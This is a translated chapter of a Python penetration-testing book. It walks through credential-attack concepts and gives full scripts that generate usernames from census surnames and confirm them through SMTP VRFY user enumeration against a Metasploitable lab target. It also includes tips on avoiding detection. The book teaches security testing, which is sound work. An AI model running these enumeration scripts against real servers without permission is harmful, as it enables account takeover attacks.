# Python 渗透测试学习指南（二）

> 原文：[`annas-archive.org/md5/A1D2E8B20998DD2DB89039EE037E2EAD`](https://annas-archive.org/md5/A1D2E8B20998DD2DB89039EE037E2EAD)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：使用 Python 执行凭证攻击

凭证攻击有多种形式，但往往被认为是渗透测试的最后一步，当其他方法都失败时。这是因为大多数新的评估者以错误的方式对待它。在讨论新评估者用于凭证攻击的工具时，最常用的两种攻击是在线字典和暴力攻击。他们通过下载包含密码和大量用户名列表的巨大字典，并针对接口运行它。当攻击失败时，评估者会进行暴力攻击。

这种攻击要么使用相同的用户名列表，要么使用超级用户（root）或本地管理员帐户。大多数情况下，这也会失败，因此字典攻击最终会被认为是不好的，并被移到参与过程的最后。这是非常错误的，因为在大多数参与过程中，特别是在面向互联网的姿态上，如果正确执行凭证攻击，您将获得访问权限。第一章，*理解渗透测试方法论*和第三章，*使用 Nmap、Scapy 和 Python 识别目标*向您介绍了一些基本的字典攻击概念，本章将在此基础上进行深入，并帮助您了解如何以及何时使用它们。在开始执行这些攻击之前，您需要对攻击类型有一个牢固的理解。

# 凭证攻击的类型

在讨论凭证攻击时，人们很容易就会想到密码攻击。请记住，对资源的认证和授权通常需要两个组件，即密码和用户名。如果您不知道密码所属的用户名，即使您拥有全世界最常用的密码也没有用。因此，凭证攻击是我们使用用户名和密码来评估资源的方式。有针对性地获取用户名的方法将在后面介绍，但现在我们必须定义密码攻击的总体类型，即在线和离线。

## 定义在线凭证攻击

在线凭证攻击是指当您针对接口或资源进行强制认证时所做的操作。这意味着您可能不知道用户名、密码，或两者都不知道，并且正在尝试确定正确的信息以获得访问权限。这些攻击是在您未能访问能够提供哈希值、明文密码或其他受保护形式数据的资源时执行的。相反，您正在尝试根据您所做的研究来做出合理的猜测。在线攻击的类型包括字典、暴力和密码喷洒攻击。请记住，资源可以是联合或集中系统的一部分，例如**Active Directory**（**AD**），或者是主机本身的本地帐户。

### 提示

对于那些喊着“混合攻击呢？”的人，大多数评估者认为它是字典攻击的一种形式，因为它只是一个单词列表的排列。如今，你几乎找不到不包含混合词的字典了。在 20 世纪 90 年代，这种情况比较少见，但随着更好的教育和更强大的系统以及经过验证的密码要求，情况已经发生了改变。

## 定义离线凭证攻击

离线凭证攻击是指当您已经破解了一个资源并提取了哈希等数据后，现在正在尝试猜测它们。这可以通过多种方式来完成，取决于哈希的类型和可用的资源，一些例子包括离线字典、基于规则的攻击、暴力攻击或彩虹表攻击。我们之所以称之为离线凭证攻击而不是离线密码攻击，是因为您正在尝试猜测密码的明文版本，而这个系统并非密码的原始来源。

这些密码哈希可能已经用随机信息或已知组件（如用户名）进行了盐化。因此，您可能仍然需要知道用户名才能破解哈希，因为盐是增加随机性的一个组成部分。现在，我已经看到一些实现使用用户名作为哈希算法的盐，这是一个非常糟糕的主意。支持这一观点的论据是，盐和用户名一样都与密码一起存储，那么这有什么关系呢？在系统中广泛使用的已知用户名，如 root、administrator 和 admin，在系统被破坏之前就已知，以及已知的加密方法，这开启了一个重大的漏洞。

这意味着盐是基于用户名的，这意味着在获得对环境的访问权限之前和参与开始之前就已知。因此，您已经有效地打败了为使破解密码更加困难而制定的机制，包括使用彩虹表。在参与开始之前已知盐意味着彩虹表对于盐化密码同样有用，只要您有一个可以处理数据的工具。

### 提示

糟糕的盐方法和自定义加密方法可能会使组织面临妥协。

离线攻击依赖于采用一个单词并使用相同的保护方法以相同格式创建哈希值作为受保护密码的前提。如果受保护的值与新创建的值相同，那么您将获得一个等效的单词并获得访问权限。大多数密码保护方法使用哈希处理来模糊值，这是一个单向函数，或者换句话说，它不能被逆转，因此该方法无法被逆转以产生原始值。

因此，当系统通过其认证方法接受密码时，它会以相同的方法对密码进行哈希处理，并将存储的哈希值与新计算的哈希值进行比较。如果它们相等，您就有了合理的保证，密码是相同的，访问将被授予。合理保证的概念取决于哈希算法的强度。一些哈希算法被认为是薄弱或破碎的，例如**消息摘要 5**（**MD5**）和**安全哈希算法 1**（**SHA-1**）。其原因是它们容易发生碰撞。

碰撞意味着所保护数据的数学可能性不具备足够的熵，以保证不同的哈希值不会等于相同的内容。事实上，由相同破碎算法哈希的两个完全不同的单词可能会创建相同的哈希值。因此，这直接影响了系统的认证方法。

当有人访问系统时，输入的密码以与系统上存储的密码相同的方法进行哈希处理。如果两个值匹配，那意味着理论上密码是相同的，除非哈希算法是薄弱的。因此，在评估系统时，您只需找到一个值，该值将创建与原始值相同的哈希。如果发生这种情况，您将获得对系统的访问权限，这就是已知碰撞的哈希的弱点所在。您不需要知道创建哈希的实际值，只需找到一个等效值，该值将创建相同的哈希。

### 提示

在撰写本文时，MD5 用于验证取证的文件系统和数据的完整性。尽管 MD5 被认为是一个破碎的哈希，但它仍被认为对于取证和文件系统的完整性来说是足够好的。其原因是要欺骗算法以大量数据集（如文件系统）需要付出不可行的工作量。在数据被调整或提取后操纵文件系统以创建相同的完整性标记是不现实的。

现在您已经了解了离线和在线凭据攻击的区别，我们需要开始生成用于它们的数据。首先是生成用户名，然后验证它们是否属于组织的一部分。这似乎是一个小步骤，但它非常重要，因为它可以缩减您的目标列表，减少您产生的噪音，并提高您攻击组织的机会。

# 识别目标

我们将以 Metasploitable 为例，因为它将允许您在安全和合法的环境中测试这些概念。首先，让我们对系统进行一个简单的`nmap`扫描，进行服务检测。以下命令突出了特定的参数和选项，它执行 SYN 扫描，寻找系统上的知名端口。

```py
nmap -sS -vvv -Pn -sV<targetIP>

```

从结果中可以看出，主机被识别为 Metasploitable，并且有许多端口开放，包括端口 25 上的**简单邮件传输协议**（**SMTP**）。

![识别目标](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_01.jpg)

# 创建有针对性的用户名

在针对组织，尤其是在边界方面，最简单的进入方式是攻击一个账户。这意味着您至少获得了该人的基本访问权限，并可以找到提升权限的方法。为此，您需要为组织确定现实的用户名。这可以通过研究在网站上工作的人员来完成，例如[`www.data.com/`](http://www.data.com/)、[`www.facebook.com/`](https://www.facebook.com/)、[`www.linkedin.com/hp/`](https://www.linkedin.com/hp/)和[`vault.com/`](http://vault.com/)。您可以使用`Harvester.py`和`Recon-ng`等工具自动化部分工作，这些工具可以获取互联网暴露和存储库。

这项初步研究很好，但你通常有限的时间来做这件事，不像恶意行为者。所以你可以做的是补充你找到的数据，生成用户名，然后对它们进行验证，例如通过启用了 VRFY 的 SMTP 或 Finger 服务端口。如果你发现这些端口开放，尤其是在互联网上针对目标组织，我首先要做的是验证我的用户名列表。这意味着我可以缩减下一步的攻击列表，我们将在第五章中进行介绍，*利用 Python 进行服务利用*。

## 利用美国人口普查生成和验证用户名

多年来，美国政府和其他国家对国家人口进行调查。这些信息对守法公民和恶意行为者都是可用的。这些细节可以用于社会工程攻击、销售研究，甚至电话推销。有些细节比其他细节更难找到，但我们最喜欢的是姓氏列表。这个 2000 年产生的列表为我们提供了美国人口中前 1000 个姓氏。

如果你曾经看过大多数组织用户名的组成部分，它通常是他们名字的第一个字母和整个姓氏。当这两个部分组合在一起时，就创建了一个用户名。使用美国人口普查的前 1000 名姓氏列表，我们可以通过下载列表提取姓氏，并在每个字母前面添加字母表中的每个字母，为每个姓氏创建 26 个用户名。这个过程将产生一个包括公开信息细节在内的 26,000 个用户名列表。

当您将通过社交媒体搜索创建的用户名列表与用于识别电子邮件地址的工具结合使用时，您可能会得到一个庞大的列表。因此，您需要将其缩减。在这个例子中，我们将向您展示如何使用 Python 从 Excel 电子表格中提取细节，然后验证由其他列表创建和组合的用户名是否与运行 VRFY 的 SMTP 服务匹配。

### 提示

西方政府通常会制作类似的列表，因此请确保您正在尝试评估的地方，并使用与组织所在地相关的信息。此外，美国属地、阿拉斯加和夏威夷等州的姓氏与美国大陆其他地区大不相同。构建您的列表以弥补这些差异。

## 生成用户名

这个过程的第一步是下载 Excel 电子表格，可以在这里找到[`www.census.gov/topics/population/genealogy/data/2000_surnames.html`](http://www.census.gov/topics/population/genealogy/data/2000_surnames.html)。您可以直接使用`wget`从控制台下载特定文件，如下所示。请记住，您应该只下载文件；除非您获得许可，否则不要评估组织或网站。以下命令相当于访问该网站并单击链接下载文件：

```py
wget http://www2.census.gov/topics/genealogy/2000surnames/Top1000.xls

```

现在打开 Excel 文件，看看它的格式，以便我们知道如何开发脚本来提取详细信息。

![生成用户名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_02.jpg)

正如您所看到的，有 11 列定义了电子表格的特征。我们关心的是姓名和排名。姓名是我们将创建用户名列表的姓氏，排名是在美国出现的顺序。在构建解析人口普查文件的函数之前，我们需要开发一种方法将数据传递到脚本中。

`argparser`库允许您快速有效地开发命令行选项和参数。`xlrd`库将用于分析 Excel 电子表格，字符串库将用于开发字母字符列表。`os`库将确认脚本正在运行的**操作系统**（**OS**），因此文件名格式可以在内部处理。最后，collections 库将提供在内存中组织从 Excel 电子表格中提取的数据的方法。唯一不是 Python 实例的库是`xlrd`，可以使用`pip`安装。

```py
#!/usr/bin/env python
import sys, string, arparse, os
from collections import namedtuple
try:
    import xlrd
except:
    sys.exit("[!] Please install the xlrd library: pip install xlrd")
```

现在您已经安装了库，可以开始构建执行工作的函数了。此脚本将包括增加或减少其冗长程度的功能。这是一个相对容易包含的功能，通过将冗长变量设置为整数值来实现；值越高，冗长越多。我们将默认为 1，并支持最多 3 个值。超过这个值将被视为 3。此函数还将接受传递的文件名，因为您永远不知道它可能会在将来更改。

我们将使用一种名为命名元组的元组形式来接受电子表格的每一行。命名元组允许您根据坐标或字段名称引用详细信息，具体取决于其定义方式。正如您所猜测的，这对于电子表格或数据库数据非常适用。为了使这对我们来说更容易，我们将以与电子表格相同的方式定义它。

```py
defcensus_parser(filename, verbose):
    # Create the named tuple
    CensusTuple = namedtuple('Census', 'name, rank, count, prop100k, cum_prop100k, pctwhite, pctblack, pctapi, pctaian, pct2prace, pcthispanic')
```

接下来，开发变量来保存工作簿、电子表格名称、总行数和电子表格的初始行。

```py
    worksheet_name = "top1000"
    #Define work book and work sheet variables
    workbook = xlrd.open_workbook(filename)
    spreadsheet = workbook.sheet_by_name(worksheet_name)
    total_rows = spreadsheet.nrows - 1
    current_row = -1
```

然后，开发初始变量来保存结果值和实际字母表。

```py
    # Define holder for details
    username_dict = {}
    surname_dict = {}
    alphabet = list(string.ascii_lowercase)
```

接下来，将遍历电子表格的每一行。`surname_dict`保存电子表格单元格的原始数据。`username_dict`将保存用户名和转换为字符串的排名。每当在排名值中检测不到点时，这意味着该值不是`float`，因此为空。这意味着该行本身不包含真实数据，应该跳过。

```py
    while current_row<total_rows:
        row = spreadsheet.row(current_row)
        current_row += 1
        entry = CensusTuple(*tuple(row)) #Passing the values of the row as a tuple into the namedtuple
        surname_dict[entry.rank] = entry
        cellname = entry.name
        cellrank = entry.rank
        for letter in alphabet:
            if "." not in str(cellrank.value):
                if verbose > 1:
                    print("[-] Eliminating table headers")
                break
            username = letter + str(cellname.value.lower())
            rank = str(cellrank.value)
            username_dict[username] = rank
```

记住，字典存储由键引用的值，但是无序的。所以我们可以做的是取出字典中存储的值，并按键（值的等级或姓氏）对它们进行排序。为此，我们将使用一个列表，并让它接受函数返回的排序后的详细信息。由于这是一个相对简单的函数，我们可以使用`lambda`创建一个无名函数，它使用可选的排序参数键来调用它，以便在处理代码时调用它。实际上，排序根据字典键为字典中的每个值创建了一个有序列表。最后，这个函数返回`username_list`和两个字典，如果将来需要的话。

```py
    username_list = sorted(username_dict, key=lambda key: username_dict[key])
    return(surname_dict, username_dict, username_list)
```

好消息是，这是整个脚本中最复杂的函数。下一个函数是一个众所周知的设计，它接受一个列表并删除重复项。该函数使用列表推导，它减少了用于创建有序列表的简单循环的大小。函数内的表达式可以写成以下形式：

```py
for item in liste_sort:
    if not noted.count(item):
        noted.append(item)
```

为了减少这个简单执行的大小并提高可读性，我们改为使用列表推导，如下摘录所示：

```py
defunique_list(list_sort, verbose):
    noted = []
    if verbose > 0:
        print("[*] Removing duplicates while maintaining order")
    [noted.append(item) for item in list_sort if not noted.count(item)] # List comprehension
    return noted
```

这个脚本的目标之一是将来自其他来源的研究合并到包含用户名的同一个文件中。用户可以传递一个文件，可以将其添加到人口普查文件输出的详细信息中。当运行这个脚本时，用户可以将文件作为预置值或附加值提供。脚本确定是哪一个，然后读取每一行，剥离每个条目的换行符。然后确定是否需要将其添加到人口普查用户名列表的末尾或开头，并设置`put_where`的变量值。最后，返回列表和`put_where`的值。

```py
defusername_file_parser(prepend_file, append_file, verbose):
    if prepend_file:
        put_where = "begin"
        filename = prepend_file
    elif append_file:
        put_where = "end"
        filename = append_file
    else:
        sys.exit("[!] There was an error in processing the supplemental username list!")
    with open(filename) as file:
        lines = [line.rstrip('\n') for line in file]
    if verbose > 1:
        if "end" in put_where:
            print("[*] Appending %d entries to the username list") % (len(lines))
        else:
            print("[*] Prepending %d entries to the username list") % (len(lines))
    return(lines, put_where)
```

只需要一个将两个用户列表合并的函数。这个函数要么使用简单的分割将新用户列表放在人口普查列表的前面，要么使用 extend 函数将数据附加到人口普查列表后面。然后调用之前创建的函数，将非唯一值减少为唯一值。知道函数的密码锁定限制，然后多次调用相同的用户帐户，锁定帐户是不好的。最终返回的项目是新的合并用户名列表。

```py
defcombine_usernames(supplemental_list, put_where, username_list, verbose):
    if "begin" in put_where:
        username_list[:0] = supplemental_list #Prepend with a slice
    if "end" in put_where:
    username_list.extend(supplemental_list)
    username_list = unique_list(username_list, verbose)
    return(username_list)
```

脚本中的最后一个函数将详细信息写入文件。为了进一步提高脚本的功能，我们可以创建两种不同类型的用户名文件：一个包括类似电子邮件地址的域，另一个是标准用户名列表。带有域的补充用户名列表将被视为可选项。

这个函数根据需要删除文件的内容，并遍历列表。如果列表是域列表，它会简单地将`@`和域名应用到每个用户名上，并将其写入文件。

```py
defwrite_username_file(username_list, filename, domain, verbose):
    open(filename, 'w').close() #Delete contents of file name
    if domain:
        domain_filename = filename + "_" + domain
        email_list = []
        open(domain_filename, 'w').close()
    if verbose > 1:
        print("[*] Writing to %s") % (filename)
    with open(filename, 'w') as file:
         file.write('\n'.join(username_list))
    if domain:
        if verbose > 1:
            print("[*] Writing domain supported list to %s") % (domain_filename)
        for line in username_list:
            email_address = line + "@" + domain
            email_list.append(email_address)
        with open(domain_filename, 'w') as file:
            file.write('\n'.join(email_list))
    return
```

现在函数已经定义好了，我们可以开发脚本的主要部分，并正确引入参数和选项。

### 注意

`argparse`库已经取代了提供类似功能的`optparse`库。值得注意的是，脚本语言中与选项和参数相关的许多弱点在这个库中得到了很好的解决。

`argparse`库提供了设置短选项和长选项的能力，可以接受由`types`定义的多个值。然后将它们呈现到您用`dest`定义的变量中。

每个参数都可以使用动作参数定义特定功能，包括值计数和其他功能。此外，每个参数都可以使用`default`参数设置`default`值。另一个有用的功能是`help`参数，它提供了用法反馈并改进了文档。我们并不是每次都在每次参与或每天都使用我们创建的每个脚本。请参见以下示例，了解如何为`census`文件添加参数。

```py
parser.add_argument("-c", "--census", type=str, help="The census file that will be used to create usernames, this can be retrieved like so:\n wget http://www2.census.gov/topics/genealogy/2000surnames/Top1000.xls", action="store", dest="census_file")
```

了解了这些简单的功能后，我们可以开发要传递给脚本的参数的要求。首先，我们验证这是否是主要函数的一部分，然后我们将`argeparse`实例化为解析器。简单的用法语句显示了执行脚本所需调用的内容。`%(prog)s`在功能上等同于在`argv`中放置`0`，因为它代表脚本名称。

```py
if __name__ == '__main__':
    # If script is executed at the CLI
    usage = '''usage: %(prog)s [-c census.xlsx] [-f output_filename] [-a append_filename] [-p prepend_filename] [-ddomain_name] -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
```

现在我们已经在解析器中定义了实例，我们需要将每个参数添加到解析器中。然后，我们定义变量`args`，它将保存每个存储参数或选项的公开引用值。

```py
    parser.add_argument("-c", "--census", type=str, help="The census file that will be used to create usernames, this can be retrieved like so:\n wget http://www2.census.gov/topics/genealogy/2000surnames/Top1000.xls", action="store", dest="census_file")
    parser.add_argument("-f", "--filename", type=str, help="Filename for output the usernames", action="store", dest="filename")
    parser.add_argument("-a","--append", type=str, action="store", help="A username list to append to the list generated from the census", dest="append_file")
    parser.add_argument("-p","--prepend", type=str, action="store", help="A username list to prepend to the list generated from the census", dest="prepend_file")
    parser.add_argument("-d","--domain", type=str, action="store", help="The domain to append to usernames", dest="domain_name")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()
```

定义了参数后，您需要验证用户是否设置了它们，并且它们是否易于通过脚本引用。

```py
    # Set Constructors
    census_file = args.census_file   # Census
    filename = args.filename         # Filename for outputs
    verbose = args.verbose           # Verbosity level
    append_file = args.append_file   # Filename for the appending usernames to the output file
    prepend_file = args.prepend_file # Filename to prepend to the usernames to the output file
    domain_name = args.domain_name   # The name of the domain to be appended to the username list
    dir = os.getcwd()                # Get current working directory
    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
  if append_file and prepend_file:
      sys.exit("[!] Please select either prepend or append for a file not both")
```

与参数验证器类似，您需要确保设置了输出文件。如果没有设置，您可以准备一个默认值以备需要使用。您需要保持操作系统不可知性，因此需要设置为在 Linux/UNIX 系统或 Windows 系统中运行。确定的最简单方法是通过`\`或`/`的方向。请记住，`\`用于转义脚本中的字符，因此请确保输入两个以取消效果。

```py
    if not filename:
        if os.name != "nt":
             filename = dir + "/census_username_list"
        else:
             filename = dir + "\\census_username_list"
    else:
        if filename:
            if "\\" or "/" in filename:
                if verbose > 1:
                    print("[*] Using filename: %s") % (filename)
        else:
            if os.name != "nt":
                filename = dir + "/" + filename
            else:
                filename = dir + "\\" + filename
                if verbose > 1:
                    print("[*] Using filename: %s") % (filename)
```

需要定义的剩余组件是在调用函数时定义的工作变量。

```py
    # Define working variables
    sur_dict = {}
    user_dict = {}
    user_list = []
    sup_username = []
    target = []
    combined_users = []
```

在遵循所有这些细节之后，您最终可以进入脚本的主要部分，即调用活动以创建用户名文件：

```py
    # Process census file
    if not census_file:
        sys.exit("[!] You did not provide a census file!")
    else:
        sur_dict, user_dict, user_list = census_parser(census_file, verbose)
    # Process supplemental username file
    if append_file or prepend_file:
        sup_username, target = username_file_parser(prepend_file, append_file, verbose)
        combined_users = combine_usernames(sup_username, target, user_list, verbose)
    else:
        combined_users = user_list
    write_username_file(combined_users, filename, domain_name, verbose)
```

以下屏幕截图演示了脚本如何输出帮助文件：

![生成用户名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_03.jpg)

可以在此处找到运行脚本和输出的示例，其中在`username.lst`中添加了用户名`msfadmin`。

![生成用户名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_04.jpg)

### 提示

可以从以下网址下载此脚本[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/username_generator.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/username_generator.py)。

我们有我们的用户名生成器，并且我们包括名称`msfadmin`，因为我们已经对测试框 Metasploitable 进行了一些初步研究。我们知道这是一个标准默认帐户，我们将要验证它是否实际存在于系统中。当您最初扫描系统并识别开放端口和服务，然后验证您准备攻击的内容时，这是研究的正常部分。该研究应包括寻找默认和已知帐户。

### 提示

在执行这些类型的攻击时，通常会排除已知系统内置帐户，例如 root。在 Windows 系统上，您仍应测试管理员帐户，因为该帐户可能已更名。您还应该避免在双盲或红队演习期间首先测试 root 登录。这通常会引起安全管理人员的警报。

# 使用 SMTP VRFY 测试用户

现在我们有了一个用户名列表，并且我们知道 SMTP 是开放的，我们需要看看`VRFY`是否已启用。这非常简单，你只需 telnet 到 25 号端口，执行`VRFY`命令，后跟一个单词，然后按回车键。通过这种方式检查用户名的好处在于，如果`VRFY`已启用，那么安全部署实践存在问题，如果它是面向互联网的，他们可能没有监控它。减少在线凭证攻击接口的凭证猜测次数将减少被抓到的机会。执行此操作的简单命令如下图所示：

![使用 SMTP VRFY 测试用户](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_05.jpg)

我们没有找到 smith，但也许其他人在这次攻击中会确认。在编写脚本之前，你需要了解大多数 SMTP 系统中可能产生的不同错误或控制消息。这些可能会有所不同，你应该设计你的脚本，使其足够灵活，以便在该环境中进行修改。

| 返回代码 | 含义 |
| --- | --- |
| 252 | 用户名在系统中。 |
| 550 | 用户名不在系统中。 |
| 503 | 服务需要身份验证才能使用。 |
| 500 | 服务不支持 VRFY。 |

现在你知道了基本的代码响应，你可以编写一个利用这个弱点的脚本。

### 注意

也许你会想为什么我们要编写一个利用这一点的脚本，当 Metasploit 和其他工具已经内置了这个模块。在许多系统中，利用这一弱点需要特殊的超时和/或节流要求。大多数其他工具，包括 Metasploit 模块，在你试图绕过这些障碍时会失败，所以 Python 才是你最好的答案。

## 创建 SMTP VRFY 脚本

由于 Metasploit 和其他攻击工具在会话尝试和每次尝试之间的延迟方面没有考虑超时，我们需要考虑通过合并这些任务使脚本更有用。如前所述，工具很棒，它们通常适用于你遇到的 80%的情况，但作为专业人士意味着适应工具可能不适用的情况。

到目前为止使用的库是常见的，但我们从第二章中添加了一个库，*Python 脚本的基础*——用于网络接口控制的 socket 库和用于控制超时的时间。

```py
#/usr/bin/env python
import socket, time, argparse, os, sys
```

下一个函数将文件读入一个列表，该列表将用于测试用户名。

```py
defread_file(filename):
    with open(filename) as file:
        lines = file.read().splitlines()
    return lines
```

接下来，修改`username_generator.py`脚本函数，将数据写入一个组合的用户名文件。这提供了一个确认的用户名列表，以便用于有用的输出格式。

```py
defwrite_username_file(username_list, filename, verbose):
    open(filename, 'w').close() #Delete contents of file name
    if verbose > 1:
        print("[*] Writing to %s") % (filename)
    with open(filename, 'w') as file:
        file.write('\n'.join(username_list))
    return
```

最后一个函数，也是最复杂的一个函数，名为`verify_smtp`，它验证用户名是否存在 SMTP `VRFY`漏洞。首先，它加载了从`read_file`函数返回的用户名，并确认了参数数据。

```py
defverify_smtp(verbose, filename, ip, timeout_value, sleep_value, port=25):
    if port is None:
        port=int(25)
    elif port is "":
        port=int(25)
    else:
        port=int(port)
    if verbose > 0:
        print "[*] Connecting to %s on port %s to execute the test" % (ip, port)
    valid_users=[]
    username_list = read_file(filename)
```

然后脚本从列表中取出每个用户名，并使用条件测试尝试连接到指定 IP 和端口的系统。当连接时，我们捕获横幅，使用用户名构建命令，并发送命令。返回的数据存储在结果变量中，并对先前记录的响应代码进行测试。如果收到 252 响应，则将用户名附加到`valid_users`列表中。

```py
    for user in username_list:
        try:
            sys.stdout.flush()
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout_value)
            connect=s.connect((ip,port))
            banner=s.recv(1024)
            if verbose > 0:
                print("[*] The system banner is: '%s'") % (str(banner))
            command='VRFY ' + user + '\n'
            if verbose > 0:
                print("[*] Executing: %s") % (command)
                print("[*] Testing entry %s of %s") % (str(username_list.index(user)),str( len(username_list)))
            s.send(command)
            result=s.recv(1024)
            if "252" in result:
                valid_users.append(user)
                if verbose > 1:
                    print("[+] Username %s is valid") % (user)
            if "550" in result:
                if verbose > 1:
                    print "[-] 550 Username does not exist"
            if "503" in result:
                print("[!] The server requires authentication")
                break
            if "500" in result:
                print("[!] The VRFY command is not supported")
                break
```

特定的中断条件被设置，以便在满足需要结束测试的条件时，脚本可以相对优雅地结束。值得注意的是，每个用户名都有一个单独的连接被建立，以防止连接被保持太久，减少错误，并提高将来将该脚本制作成多线程脚本的机会，如第十章中所述，*向 Python 工具添加永久性*。

这个脚本的最后两个组件是异常错误处理和最终的条件操作，它关闭连接，延迟下一次执行（如果需要）并清除标准输出。

```py
        except IOError as e:
            if verbose > 1:
                print("[!] The following error occured: '%s'") % (str(e))
            if 'Operation now in progress' in e:
                print("[!] The connection to SMTP failed")
                break
        finally:
            if valid_users and verbose > 0:
                print("[+] %d User(s) are Valid" % (len(valid_users)))
            elif verbose > 0 and not valid_users:
                print("[!] No valid users were found")
            s.close()
            if sleep_value is not 0:
                time.sleep(sleep_value)
            sys.stdout.flush()
    return valid_users
```

前面的脚本组件在这里被重复使用，并且它们只是针对新脚本进行了微调。看一下并确定不同的组件。然后了解如何将更改合并到将来的更改中。

```py
if __name__ == '__main__':
    # If script is executed at the CLI
    usage = '''usage: %(prog)s [-u username_file] [-f output_filename] [-iip address] [-p port_number] [-t timeout] [-s sleep] -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-u", "--usernames", type=str, help="The usernames that are to be read", action="store", dest="username_file")
    parser.add_argument("-f", "--filename", type=str, help="Filename for output the confirmed usernames", action="store", dest="filename")
    parser.add_argument("-i", "--ip", type=str, help="The IP address of the target system", action="store", dest="ip")
    parser.add_argument("-p","--port", type=int, default=25, action="store", help="The port of the target system's SMTP service", dest="port")
    parser.add_argument("-t","--timeout", type=float, default=1, action="store", help="The timeout value for service responses in seconds", dest="timeout_value")
    parser.add_argument("-s","--sleep", type=float, default=0.0, action="store", help="The wait time between each request in seconds", dest="sleep_value")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
args = parser.parse_args()
    # Set Constructors
    username_file = args.username_file   # Usernames to test
    filename = args.filename             # Filename for outputs
    verbose = args.verbose               # Verbosity level
    ip = args.ip                         # IP Address to test
    port = args.port                     # Port for the service to test
    timeout_value = args.timeout_value   # Timeout value for service connections
    sleep_value = args.sleep_value       # Sleep value between requests
    dir = os.getcwd()                    # Get current working directory
    username_list =[]  
    # Argument Validator
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    if not filename:
        if os.name != "nt":
            filename = dir + "/confirmed_username_list"
        else:
             filename = dir + "\\confirmed_username_list"
    else:
        if filename:
            if "\\" or "/" in filename:
                if verbose > 1:
                    print(" [*] Using filename: %s") % (filename)
        else:
            if os.name != "nt":
                filename = dir + "/" + filename
            else:
                filename = dir + "\\" + filename
                if verbose > 1:
                    print("[*] Using filename: %s") % (filename)
```

脚本的最后一个组件是调用特定函数来执行脚本。

```py
username_list = verify_smtp(verbose, username_file, ip, timeout_value, sleep_value, port)
if len(username_list) > 0:
    write_username_file(username_list, filename, verbose)
```

脚本具有默认的帮助功能，就像`username_generator.py`脚本一样，如下截图所示：

![创建 SMTP VRFY 脚本](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_06.jpg)

这个脚本的最终版本将产生如下输出：

![创建 SMTP VRFY 脚本](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_07.jpg)

执行以下命令后，将用户名平面文件传递给它，目标的 IP 地址，SMTP 服务的端口和输出文件，脚本具有默认的睡眠值为`0.0`和默认超时值为`1`秒。如果在互联网上进行测试，可能需要增加这个值。

![创建 SMTP VRFY 脚本](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_04_08.jpg)

我们在系统上验证的一个用户毫不奇怪地是`msfadmin`账户。不过，如果这是一个真实的系统，你已经减少了需要有效测试的账户数量，从而将凭证攻击方程式缩小了一半。现在，你只需要找到一个想要测试的服务。

### 提示

这个脚本可以从[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/smtp_vrfy.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/smtp_vrfy.py)下载。

# 摘要

本章涵盖了许多关于从外部来源操作文件到低级连接资源的细节。最终结果是能够识别潜在的用户账户并验证它们。这些活动还突出了`argparse`库的参数和选项的正确使用，以及脚本的使用可以满足开发工具无法满足的需求。所有这些都是为了利用我们将在下一章中介绍的服务而构建的。


# 第五章：用 Python 利用服务

今天渗透测试和利用服务的一个重要误解是，可利用的**远程代码执行**（**RCE**）漏洞的普遍存在。现实是，找到数百个易受攻击的服务，只需要将**Internet Protocol**（**IP**）地址插入工具中即可利用的日子已经基本结束了。你仍然会发现可以通过溢出堆栈或堆来利用的漏洞，只是数量大大减少或更加复杂。我们将解释为什么在今天的软件中这些漏洞更难利用，在第八章中，*用 Python、Metasploit 和 Immunity 进行利用开发*，别担心，我们会讲到的。

所以，如果你期望每次进入网络并利用 Microsoft Security Bulletins MS08-067、MS03-024 或 MS06-40 来立足，那你大错特错了。不要担心，它们仍然存在，但不是在每台主机上都能找到，可能只有网络中的一台系统有这些漏洞。更糟糕的是，对于我们作为模拟恶意行为者来说，它甚至可能无法让我们访问一个允许我们在参与中前进的盒子。通常情况下，它可能是一个遗留系统或一个甚至没有连接到不同凭证集的域的供应商产品。当然，并不是总是这种情况。

找到的 RCE 漏洞数量完全取决于组织的安全成熟度。这与规模或预算无关，而是与他们的安全计划实施策略有关。安全策略薄弱且新成立的程序的组织将有更多这样的漏洞，而安全策略更好的组织将有更少。许多新的渗透测试人员忽视的另一个因素是人才；公司可能在防御方面雇佣的人员，这可能会显著影响他们在环境中的操作能力。

